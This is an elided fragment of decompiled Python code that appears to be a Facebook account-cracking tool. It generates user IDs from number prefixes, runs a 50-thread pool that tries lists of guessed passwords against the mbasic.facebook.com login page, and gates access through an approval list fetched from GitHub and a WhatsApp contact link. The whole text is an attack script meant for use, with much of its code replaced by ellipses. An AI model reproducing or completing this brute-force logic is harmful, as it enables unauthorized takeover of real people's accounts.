...
# Time Succes decompile : 2023-11-21 11:49:01.150781
...
def xxr():
    ...
    rk6 = '0187'
    rk7 = '0188'
    code = random.choice([rk1,rk2,rk3,rk4,rk5,rk6,rk7])                      # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    print(logo)
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(' \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××')
        for love in user:
            pwx = [love[1:],love,ps1,ps2,ps3,ps4,ps5,ps6,ps7]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
  		  ...
  		  'dpr': '2',
  		  'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Fhome.php%3Frefid%3D13&refsrc=deprecated&wtsid=rdr_0O6JIjbzNDZdMkUUV&refid=13&_rdr',
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Coxsakib/EHC-SAKIB1/blob/main/Aprovale1.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
        ...
        os.system('am start https://wa.me/+880533648006?text=' + tks)
        superuser()        
superuser()
